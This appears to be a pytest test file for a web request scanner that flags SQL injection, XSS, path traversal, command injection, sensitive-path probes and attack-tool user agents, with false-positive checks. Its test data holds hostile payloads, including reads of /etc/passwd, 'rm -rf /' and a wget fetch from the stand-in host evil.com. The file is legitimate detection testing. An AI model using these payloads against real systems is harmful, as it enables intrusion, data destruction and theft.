"""可疑访问扫描器测试 —— 校验各攻击类型识别、编码绕过与误报控制。

仅测试纯扫描逻辑（scan_request），不涉及封禁与中间件。
"""

import pytest

from utils.security_scanner import (
    scan_request,
    TYPE_SQL_INJECTION,
    TYPE_XSS,
    TYPE_PATH_TRAVERSAL,
    TYPE_COMMAND_INJECTION,
    TYPE_SENSITIVE_PROBE,
    TYPE_MALICIOUS_UA,
)


def _scan(path, query='', body='', ua=''):
    return scan_request(path=path, query_string=query, body=body, user_agent=ua)


class TestSqlInjection:
    @pytest.mark.parametrize('query', [
        "id=1' OR '1'='1",
        "id=1' or 1=1--",
        'id=1 UNION SELECT username,password FROM users',
        'id=1%27%20OR%201%3D1--',
        "q=' AND 1=1",
        'id=1;SELECT * FROM users',
        'id=1 AND sleep(5)',
        'id=1 OR benchmark(10000000,md5(1))',
        'id=1 OR 1=1',
    ])
    def test_detect(self, query):
        attack, matched = _scan('/search', query)
        assert attack == TYPE_SQL_INJECTION, f'应识别 SQL 注入: {query}'
        assert matched

    def test_url_encoded_payload(self):
        # %27 = '，%20 = 空格，%3d = =
        attack, _ = _scan('/search', 'id=1%27%20or%201%3d1--')
        assert attack == TYPE_SQL_INJECTION


class TestXss:
    @pytest.mark.parametrize('query', [
        'q=<script>alert(1)</script>',
        'q=%3Cscript%3Ealert(1)%3C/script%3E',
        'url=javascript:alert(1)',
        'url=javascript%3Aalert(1)',
        'q=<img src=x onerror=alert(1)>',
        'q=<svg/onload=alert(1)>',
        'q=" onload="alert(1)"',
        'q=document.cookie',
        'q=eval(alert(1))',
    ])
    def test_detect(self, query):
        attack, _ = _scan('/search', query)
        assert attack == TYPE_XSS, f'应识别 XSS: {query}'


class TestPathTraversal:
    @pytest.mark.parametrize('query', [
        'file=../../etc/passwd',
        'file=..%2f..%2fetc%2fpasswd',
        'file=%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        'path=/etc/passwd',
        'path=/etc/shadow',
        'file=%00',
        'f=../../../../boot.ini',
    ])
    def test_detect(self, query):
        attack, _ = _scan('/download', query)
        assert attack == TYPE_PATH_TRAVERSAL, f'应识别路径穿越: {query}'


class TestCommandInjection:
    @pytest.mark.parametrize('query', [
        'cmd=1;cat /etc/passwd',
        'ip=127.0.0.1|whoami',
        'ip=127.0.0.1%3Bwhoami',
        'x=`id`',
        'x=$(whoami)',
        'cmd=ping -c 1 8.8.8.8; rm -rf /',
        'ip=1.1.1.1 && wget http://evil.com/x',
    ])
    def test_detect(self, query):
        attack, _ = _scan('/ping', query)
        assert attack == TYPE_COMMAND_INJECTION, f'应识别命令注入: {query}'


class TestSensitiveProbe:
    @pytest.mark.parametrize('path', [
        '/.env',
        '/.git/config',
        '/.svn/entries',
        '/phpmyadmin/',
        '/wp-admin/',
        '/phpinfo.php',
        '/config.php',
        '/actuator/env',
        '/vendor/composer/installed.json',
        '/cgi-bin/test.cgi',
    ])
    def test_detect(self, path):
        attack, _ = _scan(path)
        assert attack == TYPE_SENSITIVE_PROBE, f'应识别敏感探测: {path}'


class TestMaliciousUA:
    @pytest.mark.parametrize('ua', [
        'sqlmap/1.7 (http://sqlmap.org)',
        'Mozilla/5.0 Nikto/2.5.0',
        'nuclei/v3.2.1',
        'Mozilla/5.0 (compatible; wpscan/3.8)',
        'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
    ])
    def test_detect(self, ua):
        attack, _ = _scan('/', '', '', ua)
        assert attack == TYPE_MALICIOUS_UA, f'应识别恶意 UA: {ua}'

    def test_legitimate_ua_not_detected(self):
        attack, _ = _scan('/', '', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36')
        assert attack is None


class TestBodyScan:
    def test_sql_injection_in_body(self):
        attack, _ = _scan('/login', '', "username=admin' OR '1'='1&password=x")
        assert attack == TYPE_SQL_INJECTION

    def test_union_select_in_body(self):
        attack, _ = _scan('/login', '', 'username=admin UNION SELECT 1,2&password=x')
        assert attack == TYPE_SQL_INJECTION

    def test_command_injection_in_body(self):
        attack, _ = _scan('/login', '', 'username=x;whoami&password=y')
        assert attack == TYPE_COMMAND_INJECTION

    def test_markdown_code_block_not_false_positive(self):
        # 讨论区用户生成内容：markdown 代码块（反引号 + select + <script> 演示）不应误判
        body = (
            'content=这是一个测试帖子，代码如下：\n'
            '```sql\nSELECT * FROM users WHERE id = 1;\n```\n'
            '以及 HTML 示例：\n'
            '```html\n<script>console.log(1)</script>\n```'
        )
        attack, _ = _scan('/discussion/create', '', body)
        assert attack is None, '用户生成内容不应误判为攻击'

    def test_chinese_text_not_detected(self):
        attack, _ = _scan('/discussion/create', '', 'content=今天天气不错，我们一起去服务器玩吧。')
        assert attack is None


class TestNormalRequests:
    def test_plain_page(self):
        assert _scan('/') == (None, '')

    def test_normal_query(self):
        assert _scan('/discussion', 'page=2&category=综合') == (None, '')

    def test_music_stream(self):
        assert _scan('/music/12.m3u8') == (None, '')

    def test_chinese_keyword_query(self):
        assert _scan('/guides', 'keyword=红石机器教程') == (None, '')

    def test_emoji_and_unicode(self):
        assert _scan('/search', 'q=😀 你好 & 再见') == (None, '')
